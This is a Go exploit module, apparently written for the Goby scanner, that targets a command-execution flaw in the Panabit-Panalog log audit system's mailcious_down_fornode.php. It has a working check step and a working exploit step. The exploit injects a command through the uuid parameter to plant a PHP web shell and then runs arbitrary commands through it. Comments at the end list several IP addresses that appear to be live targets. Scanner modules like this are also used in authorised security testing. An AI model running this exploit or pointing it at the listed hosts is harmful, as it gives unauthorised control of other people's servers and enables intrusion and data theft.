package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Panabit-Panalog mailcious_down_fornode.php RCE",
    "Description": "<p>The panabit log audit system of Beijing paiwang company can collect all log data from users, including session data, event data and identity data, and process the data effectively. The processing methods include ranking, distribution, trend and similarity. With the help of good distributed design concept, it can linearly expand the data storage and processing capacity in the form of cluster, and provide raw data file interface for Hadoop and other big data processing platforms, showing full openness. The built-in analysis tools represented by traffic flow direction, traffic profile, user portrait, 7-layer application event reverse query, access sequencing, virtual identity information, mobile terminal identification, user behavior, geographical location, end-user heat map, IP track, top domain name, application traffic flow diagram, URL map, top user, connection visual analysis and DNS visual analysis provide users with comprehensive records, understanding Ability to analyze and master network details and trends. There is a command execution vulnerability in the panabit log audit system of Beijing paiwang company, which can be used by attackers to obtain server control privileges.</p>",
    "Product": "Panabit-Panalog",
    "Homepage": "http://www.panabit.com/",
    "DisclosureDate": "2022-04-04",
    "Author": "1243099890@qq.com",
    "FofaQuery": "(body=\"id=\\\"codeno\\\"\" && body=\"日志系统\") || title=\"panalog\"",
    "GobyQuery": "(body=\"id=\\\"codeno\\\"\" && body=\"日志系统\") || title=\"panalog\"",
    "Level": "3",
    "Impact": "<p>Beijing paiwang Panabit-Panalog log audit system mailcious_down_fornode.php attackers to execute commands without authorization.</p>",
    "Recommendation": "<p>Filter sensitive commands and functions, and update the software upgrade package</p><p>Link：https://www.panabit.com/cn/product/2021/0107/379.html</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mailcious_down_fornode.php?action=check&uuid=ccc;echo%20'<?php%20echo%20md5(233);unlink(__FILE__);?>'>cry.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cry.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mailcious_down_fornode.php?action=check&uuid=c;echo '<?php system($_POST[cmd]);?>'>vul.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/vul.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close",
                    "Content-Length": "10"
                },
                "data_type": "text",
                "data": "cmd={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "Panabit-Panalog日志系统 mailcious_down_fornode.php 命令执行",
            "Product": "Panabit-Panalog",
            "Description": "<p>北京派网公司&nbsp;Panabit日志审计系统可以收集来自用户的所有日志数据，包括Session数据、事件数据和身份数据，并对数据进行有效的加工处理，处理方式包括排名、分布、趋势和相似性。借助良好的分布式设计理念，可以以集群方式线性扩大数据存储和处理能力，并为Hadoop等大数据处理平台提供raw data文件接口，展示充分的开放性。以流量流向、流量概况、用户画像、7层应用事件反查、访问排序、虚拟身份信息、移动终端识别、用户行为、地理位置、终端用户热力图、IP轨迹、TOP域名、应用流量流向图、URL地图、TOP用户、连接可视化分析和DNS可视化分析等为代表的内置分析工具，为用户提供了全面记录、了解、分析和掌握网络细节和趋势的能力。<span style=\"font-size: 16px;\">北京派网公司</span><span style=\"font-size: 16px;\">&nbsp;Panabit日志审计系统存在命令执行漏洞，攻击者可以使用该漏洞拿到服务器控制权限。</span><br></p>",
            "Recommendation": "<p>过滤敏感命令函数等</p><p>更新软件升级包:<br></p><p><a href=\"https://www.panabit.com/cn/product/2021/0107/379.html\">https://www.panabit.com/cn/product/2021/0107/379.html</a><br></p>",
            "Impact": "<p><span style=\"font-size: 16px;\">北京派网Panabit日志审计系统mailcious_down_fornode.php存在未授权命令执行漏洞，攻击者可以通过执行命令进行恶意操作，如拿到服务器控制权限。<span style=\"font-size: 16px;\">如果发现命令只能执行一次，请在命令前面加入任意字符串或者数字，如：1;whoami。如果命令执行不出来就一直在命令前面加入不同的字符串或数字。</span></span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Panabit-Panalog mailcious_down_fornode.php RCE",
            "Product": "Panabit-Panalog",
            "Description": "<p>The panabit log audit system of Beijing paiwang company can collect all log data from users, including session data, event data and identity data, and process the data effectively. The processing methods include ranking, distribution, trend and similarity. With the help of good distributed design concept, it can linearly expand the data storage and processing capacity in the form of cluster, and provide raw data file interface for Hadoop and other big data processing platforms, showing full openness. The built-in analysis tools represented by traffic flow direction, traffic profile, user portrait, 7-layer application event reverse query, access sequencing, virtual identity information, mobile terminal identification, user behavior, geographical location, end-user heat map, IP track, top domain name, application traffic flow diagram, URL map, top user, connection visual analysis and DNS visual analysis provide users with comprehensive records, understanding Ability to analyze and master network details and trends. There is a command execution vulnerability in the panabit log audit system of Beijing paiwang company, which can be used by attackers to obtain server control privileges.<br></p>",
            "Recommendation": "<p>Filter sensitive commands and functions, and update the software upgrade package<br></p><p><span style=\"font-size: 16px;\">Link：<a href=\"https://www.panabit.com/cn/product/2021/0107/379.html\" style=\"\">https://www.panabit.com/cn/product/2021/0107/379.html</a></span><br></p>",
            "Impact": "<p>Beijing paiwang Panabit-Panalog&nbsp;log audit system <span style=\"color: rgb(22, 51, 102); font-size: 16px;\">mailcious_down_fornode.php&nbsp;</span>attackers to execute commands without authorization.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			RandStr := goutils.RandomHexString(6)
			uri1 := "/mailcious_down_fornode.php?action=check&uuid=ccc;echo%20'<?php%20echo%20md5(233);unlink(__FILE__);?>'>"+RandStr+".php"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody,"YES"){
					uri2 := "/"+RandStr+".php"
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody,"e165421110ba03099a1c0393373c5b43")
					}
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandStr := goutils.RandomHexString(6)
			uri1 := "/mailcious_down_fornode.php?action=check&uuid=c;echo%20'<?php%20system($_POST[cmd]);?>'>"+RandStr+".php"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody,"YES"){
					uri2 := "/"+RandStr+".php"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type","application/x-www-form-urlencoded")
					cfg2.Data = "cmd="+cmd
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						expResult.Output = resp2.RawBody
						expResult.Success = true
					}
				}
			}

			return expResult
		},
	))
}
//https://223.65.202.194:10443
//https://36.109.194.2:60443
//https://183.131.110.9:60001
//https://118.26.65.165
//https://112.102.172.203:8444
//https://220.201.218.83:8444
//https://103.39.208.212